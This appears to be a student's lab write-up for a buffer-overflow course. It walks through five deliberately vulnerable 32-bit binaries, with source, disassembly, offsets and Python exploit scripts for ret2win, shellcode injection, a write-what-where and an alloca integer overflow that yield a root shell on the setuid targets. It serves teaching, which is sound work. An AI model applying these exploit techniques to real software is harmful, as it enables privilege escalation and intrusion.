0Overview and reading guide

All five binaries are 32-bit, statically linked, non-PIE, and built without a stack canary. Targets 0 and 1 are ordinary student-owned binaries; targets 2, 3, and 4 are setuid-root. The helper normalizes the stack so the addresses in the GDB logs are stable on this VM (ASLR is disabled globally).

TargetInput methodCore bugKey address(s)Result
target0 stdin to gets(name) overflow from name into adjacent grade name=0xfff6ba51, grade=0xfff6ba5b changes grade to A+
target1 stdin to gets(input) return address overwrite (ret2win) print_good_grade=0x0804a123, saved EIP slot 0xfff6ba5c prints “Your grade is perfect.”
target2 argv[1] to strcpy stack buffer overflow, executable stack buf=0xfff6b9dc, saved EIP slot 0xfff6ba4c root shell
target3 argv[1] to strncpy overwrites a and p, then *p = a buf=0xfff6b238, p=0xfff6ba4c root shell
target4 binary file via read_file alloca size overflow; huge read_elements count buf=0xfff6ba20, return slot 0xfff6ba4c root shell
How to read the GDB excerpts EBP is the frame base. Addresses below EBP are locals; [EBP] is the saved EBP; [EBP+4] is the saved return address that ret pops into EIP. An address printed as 0x804a123 is the same as 0x0804a123; GDB just omits leading zeroes.
Build flags used by the lab gcc -g -m32 -static -U_FORTIFY_SOURCE -fno-stack-protector. Targets 0–4 add -z execstack, so their stacks are readable, writable, and executable. Targets 2–4 are mode 6777, owner root.

1Target 0 — overwrite the grade

stdin · gets · no return-address overwrite

Target 0 is the simplest case: two arrays sit next to each other on the stack, and gets() can write past name into grade. This is not a return-address exploit; it changes the program's data.

Objective: make the program print a good grade. grade is initialized to "nil"; gets(name) has no bound.

target0.c

int _main(int argc, char *argv[])
{
    char grade[5];
    char name[10];

    strcpy(grade, "nil");

    gets(name);                 // no bounds check

    printf("Hi %s! Your grade is %s.\n", name, grade);

    exit(0);
}

Key assembly from _main

0804a0a7: lea    eax,[ebp-0xd]       ; &grade
0804a0aa: mov    DWORD PTR [eax],0x6c696e  ; "nil\0"
0804a0b3: lea    eax,[ebp-0x17]      ; &name
0804a0b7: call   gets                ; reads unbounded input
...
0804a0c2: lea    eax,[ebp-0xd]       ; grade argument to printf
0804a0c6: lea    eax,[ebp-0x17]      ; name argument to printf

The important constants are 0xd and 0x17: the distance between name and grade is 0x17 - 0xd = 0xa = 10 bytes.

Why the three NUL bytes are there The SID is 7 bytes long, but name is 10 bytes. The three NUL bytes fill name[7..9], so the following bytes land exactly at grade[0]. They also terminate the string, which is why the program prints only the SID and not the grade bytes as part of the name. gets adds the final NUL after "A+", so the grade string becomes exactly "A+".

2Target 1 — return to print_good_grade

stdin · gets · ret2win

Target 1 turns the overflow into control flow. The function print_good_grade() already exists at a fixed address; the goal is to overwrite the saved return address of vulnerable() with that address.

target1.c

void print_good_grade(void)
{
    puts("Your grade is perfect.");
    exit(1);
}

void vulnerable()
{
    char input[4];
    gets(input);            // unbounded read into 4-byte buffer
}

int _main()
{
    vulnerable();
    print_bad_grade();      // normal path
    return 0;
}

The offset calculation input starts at EBP-0xc. The saved EBP is at EBP+0, and the saved EIP is at EBP+4. Therefore the distance from input[0] to the saved EIP is 0xc + 4 = 16 bytes.

sol1.py, line by line

sol1.py
import sys

padding = b"A" * 16                    # fill input[4] + 12 bytes of frame

target = (0x0804a123).to_bytes(4, "little")  # print_good_grade

payload = padding + target             # 16 bytes + new saved EIP

sys.stdout.buffer.write(payload)       # stdin for ./target1
LineWhy it is correct

0x0804a123The first instruction of print_good_grade, confirmed by nm target1 and the GDB trace.
to_bytes(4, "little")x86 is little-endian: 0x0804a123 becomes bytes 23 a1 04 08.
padding + targetAt offset 16, the saved return address is replaced with the win function.
sys.stdout.buffer.writegets reads these bytes from stdin.
Why it works When vulnerable() executes leave; ret, leave restores the stack pointer to the saved EIP slot, and ret pops 0x0804a123 into EIP. Execution jumps directly to print_good_grade, bypassing print_bad_grade.

3Target 2 — return to shellcode

argv · strcpy · executable stack · setuid root

Target 2 is the classic shellcode target. The stack is executable, the binary is statically linked and non-PIE, and the helper normalizes the stack, so the buffer address is stable. The payload puts shellcode at the start of the buffer and returns to it.

target2.c

void vulnerable(char *arg)
{
    char buf[100];
    strcpy(buf, arg);       // no bounds check
}

int _main(int argc, char **argv)
{
    if (argc != 2) { ... }
    vulnerable(argv[1]);    // attacker-controlled argv[1]
    return 0;
}

Offset to saved EIP buf starts at EBP-0x6c; saved EIP is at EBP+4. The distance is 0x6c + 4 = 0x70 = 112 bytes. The binary was built with -z execstack; readelf shows GNU_STACK ... RWE, so returning to bytes in the buffer is allowed.

What the shellcode does shellcode.py is 53 bytes. The first 8 bytes call setuid(0). The rest use the classic call/pop trick to find the "/bin/sh" string, set up execve, and replace the process with /bin/sh. Because target2 is setuid-root, setuid(0) makes the shell root.

4Target 3 — write-what-where

argv · strncpy · *p = a · setuid root

Target 3 does not overflow all the way to the saved return address. Instead, strncpy copies exactly 8 bytes past a 2048-byte buffer, overwriting two local variables: a and p. The next line, *p = a, then performs an attacker-controlled 4-byte write.

target3.c

void vulnerable(char *arg)
{
    int *p;
    int a;
    char buf[2048];

    strncpy(buf, arg, sizeof(buf) + 8);  // 2056 bytes!

    *p = a;                              // write a to *p
}

The 8 extra bytes buf occupies EBP-0x810 through EBP-0x11. The two locals are directly above it: a at EBP-0x10 and p at EBP-0xc. Copying 2056 bytes instead of 2048 writes exactly those 8 bytes. The saved return address at EBP+4 is untouched for now.

LineWhy it is correct
payload = shellcodeShellcode starts at BUF=0xfff6b238.
padding_length = 2048 - len(shellcode)Fills the entire declared 2048-byte array.
a = 0xfff6b238The value that will be written. It is the shellcode's address.
p = 0xfff6ba4cThe destination. It is the saved-EIP slot of vulnerable().

Why the order is a then p The stack layout is buf[2048], then a at EBP-0x10, then p at EBP-0xc. Copying past the buffer writes the first 4 extra bytes into a and the next 4 into p. After that, the program executes mov eax,[EBP-0xc] (load p), mov edx,[EBP-0x10] (load a), and mov [eax],edx (write a to *p). The saved EIP becomes the shellcode address, and ret jumps to it.
This is not a normal return-address overflow The payload does not directly overwrite EBP+4. It abuses the programming bug *p = a, where both p and a are uninitialized locals that the overflow controls. That is why the exploit works even though strncpy stops 8 bytes past the buffer.

5Target 4 — alloca integer overflow

file input · alloca · read_elements · setuid root

Target 4 does not read a command-line string. It reads a binary file: the first 4 bytes are a count, followed by 32-bit integers. The count is used for an alloca(count * 4), but 0x40000000 * 4 wraps to zero in 32-bit arithmetic. The allocation becomes zero bytes, while read_elements still believes the count is huge and keeps reading words into the stack.

target4.c

void read_elements(FILE *f, int *buf, unsigned int count)
{
    unsigned int i;
    for (i=0; i < count; i++) {
        if (fread(&buf[i], sizeof(unsigned int), 1, f) < 1)
            break;
    }
}

void read_file(char *name)
{
    FILE *f = fopen(name, "rb");
    unsigned int count;
    fread(&count, sizeof(unsigned int), 1, f);

    unsigned int *buf = alloca(count * sizeof(unsigned int));

    read_elements(f, buf, count);   // still uses the huge count
}

Key assembly — the size wraps to zero

804a14f: lea edx,[eax+0xc]
...
804a166: div ecx
804a168: imul eax,eax,0x10
804a16b: sub esp,eax          ; alloca(size)
804a16d: mov eax,esp
...

804a188: push buf
804a18b: push f

With count = 0x40000000, shl eax,2 produces 0x00000000. The stack is not moved, so buf points at the current stack position. The later loop still uses the original huge count.

The file format First 4 bytes: count = 0x40000000 (little-endian 00 00 00 40). Then the file contains 160 4-byte words. The first 11 words are NOPs, word 11 is the return address, and the remaining words are a NOP sled followed by shellcode. The file is generated by sol4.py, not passed as an argument.

Why index 11? The buffer pointer is 0xfff6ba20. The saved EIP slot is 0xfff6ba4c. Their difference is 0x2c = 44 bytes, which is exactly 11 * 4. So the 12th 32-bit word, index 11, lands on the saved return address. Words 0–10 are NOP filler, word 11 is the new return address, and words 12 onward contain the NOP sled and shellcode.
Why the count variable in GDB shows 0x90909090 later The local count lives at EBP-0x14 = 0xfff6ba34, which is inside the overflowed region (buffer index 5). The payload overwrites it with NOPs. But read_elements received its own count argument before the overwrite, so its loop still uses 0x40000000 and keeps reading until fread hits EOF. The overwritten copy in read_file is no longer used after the call.

sol4.py, line by line

sol4.py
import sys
from shellcode import shellcode

return_address = 11           # word index that lands on saved EIP
buff = 0xfff6ba20             # buffer start from GDB

overflow = 0x40000000         # count * 4 wraps to 0

sc = bytes(shellcode)
while len(sc) % 4:
    sc += b"\x90"
sc_ints = [int.from_bytes(sc[i:i+4], "little")
           for i in range(0, len(sc), 4)]

total  = 160
sled_n = total - (return_address + 1) - len(sc_ints)

payload  = [0x90909090] * return_address
payload += [0]
payload += [0x90909090] * sled_n
payload += sc_ints

payload[return_address] = buff + 4 * (return_address + 1 + sled_n // 2)

sys.stdout.buffer.write(overflow.to_bytes(4, "little"))
for v in payload:
    sys.stdout.buffer.write(v.to_bytes(4, "little"))

6Address cheat sheet

These are the values that matter most when re-doing the targets or reading the GDB logs. They are stable on this VM because the helper normalizes the stack and ASLR is disabled globally.

TargetBuffer / sourceSaved EIP slotPayload offsetTarget value
target0 name=0xfff6ba51
grade=0xfff6ba5b		 0xfff6ba6c 10 bytes name → grade grade becomes "A+"
target1 input=0xfff6ba4c 0xfff6ba5c 16 bytes 0x0804a123 → print_good_grade
target2 buf=0xfff6b9dc 0xfff6ba4c 112 bytes 0xfff6b9dc → shellcode at buf
target3 buf=0xfff6b238
a=0xfff6ba38, p=0xfff6ba3c		 0xfff6ba4c 2048 + 8 bytes a=0xfff6b238, p=0xfff6ba4c
target4 buf=0xfff6ba20
count at buffer index 5		 0xfff6ba4c word index 11 0xfff6bb5c → NOP sled
General pattern across targets 2–4 Find the buffer address in GDB, calculate the distance to [EBP+4], decide whether you can overwrite it directly (target2), indirectly through a controlled write (target3), or through a file-driven loop (target4), then point execution at shellcode or an existing function. The stack is executable for all three, which is why injecting shellcode works.
